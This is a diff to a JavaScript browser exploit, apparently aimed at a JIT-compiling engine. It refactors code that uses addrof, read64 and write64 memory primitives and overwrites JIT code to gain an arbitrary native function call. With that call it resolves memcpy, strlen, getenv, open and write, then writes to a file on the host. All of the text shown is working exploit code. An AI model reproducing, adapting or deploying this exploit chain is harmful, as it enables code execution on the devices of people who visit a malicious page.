@@ -315,8 +315,7 @@ function pwn() {
         victim.prop = i2f(val);
     }
     
-    function ByteToDwordArray(payload)
-    {
+    function ByteToDwordArray(payload) {
         let sc = []
         let tmp = 0;
         let len = Math.ceil(payload.length/6)
@@ -337,8 +336,7 @@ function pwn() {
         return sc;
     }
     
-    function ArbitraryWrite(addr, payload)
-    {
+    function ArbitraryWrite(addr, payload) {
         let sc = ByteToDwordArray(payload);
         for(let i=0; i<sc.length; i++) {
             write64(addr+i*6, sc[i]);
@@ -370,28 +368,16 @@ function pwn() {
         0x00, 0x00, 0x00, 0x00
     ]);
     
-    // initialize arb call
-    let array = new Uint8Array(0x2345).fill(0);
-    let arrayView = new DataView(array.buffer);
-    let arrayAddr = read64(addrof(array) + 0x10);
-    log(`[+] arrayAddr = 0x${arrayAddr.toString(16)}`);
-    new DataView(arbCallBytes.buffer).setBigUint64(0x48, BigInt(arrayAddr), true);
-    var shellcodeFuncAddr = addrof(shellcodeFunc);
-    log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
-    var executableAddr = read64(shellcodeFuncAddr + 24);
-    log(`[+] Executable instance @ ${executableAddr.toString(16)}`);
-    var jitCodeAddr = read64(executableAddr + 8);
-    log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
-    var JITCode = read64(jitCodeAddr + 0x1a8);
-    log(`[+] JITCode @ ${JITCode.toString(16)}`);
+    // initialize arbitrary call primitive
+    let arbCallContext = new BigUint64Array(11);
+    let arbCallContextAddr = read64(addrof(arbCallContext) + 0x10);
+    log(`[+] arbCallContext address: 0x${arbCallContextAddr.toString(16)}`);
+    new DataView(arbCallBytes.buffer).setBigUint64(0x48, BigInt(arbCallContextAddr), true);
+    var JITCode = read64(read64(read64(addrof(shellcodeFunc) + 24) + 8) + 0x1a8);
+    log(`[+] JITCode address: 0x${JITCode.toString(16)}`);
     ArbitraryWrite(JITCode, arbCallBytes);
     
-    // method 1, requires NULL terminated string. eg. "exit\0"
-    // function getStringAddress(str) {
-    //    return read64(addrof(str) + 0x8) + 20;
-    // }
-    
-    // method 2
+    // function to make a c string from a JS string and return it's address
     function getStringAddress(str) {
         let encoder = new TextEncoder();
         let byteArray = encoder.encode(str);
@@ -405,8 +391,8 @@ function pwn() {
             log("[+] Only 9 args are allowed!\n");
             return -1;
         }
-        //log(`[+] func: 0x${func.toString(16)}`);
-        arrayView.setBigUint64(0x0, BigInt(func), true);
+        arbCallContext.fill(0n);
+        arbCallContext[0] = BigInt(func);
         for (let i = 0; i < args.length; i++) {
             let arg = args[i];
             let value;
@@ -420,12 +406,10 @@ function pwn() {
                 default:
                     value = BigInt(arg);
             }
-            //log(`[+] x${i}: 0x${value.toString(16)}`);
-            arrayView.setBigUint64(16 + (i * 8), value, true);
+            arbCallContext[2 + i] = value;
         }
         shellcodeFunc();
-        for (let i = 0; i < 9; i++) arrayView.setBigUint64(16 + (i * 8), 0n, true);
-        return arrayView.getBigUint64(0x8, true);
+        return arbCallContext[1];
     }
     
     let dlsymAddr = 0x18039e2b8;
@@ -442,34 +426,41 @@ function pwn() {
     log(`[+] open address: 0x${openAddr.toString(16)}`);
     log(`[+] write address: 0x${writeAddr.toString(16)}`);
     
+    // memcpy wrapper function
     function memcpy(destination, source, size) {
         return arbCall(memcpyAddr, destination, source, size);
     }
     
-    function strlen(string) {
-        return Number(arbCall(strlenAddr, string));
-    }
-    
+    // read arbitrary number of bytes from an address via memcpy
     function readbuf(addr, size) {
         let uint8Array = new Uint8Array(size);
         memcpy(uint8Array, addr, size);
         return uint8Array;
     }
     
+    // strlen wrapper function
+    function strlen(string) {
+        return Number(arbCall(strlenAddr, string));
+    }
+    
+    // function to make a JS string from a c string at a given address
     function readString(stringAddr) {
         if (stringAddr == 0) return "";
         let stringBytes = readbuf(stringAddr, strlen(stringAddr));
         return new TextDecoder('utf-8').decode(stringBytes);
     }
     
+    // getenv wrapper function
     function getenv(name) {
         return readString(arbCall(getenvAddr, name));
     }
     
+    // open wrapper function
     function open(path, flags) {
         return arbCall(openAddr, path, flags);
     }
     
+    // write wrapper function
     function write(fd, buf, size) {
         return arbCall(writeAddr, fd, buf, size);
     }
@@ -490,10 +481,9 @@ function pwn() {
         log("[+] Failed to open file!");
         return;
     }
+    
     log(`[+] fd: ${fd}`);
-    
     write(fd, "Hello, World!", 13);
-    
 }
 
 function logBytes(array) {
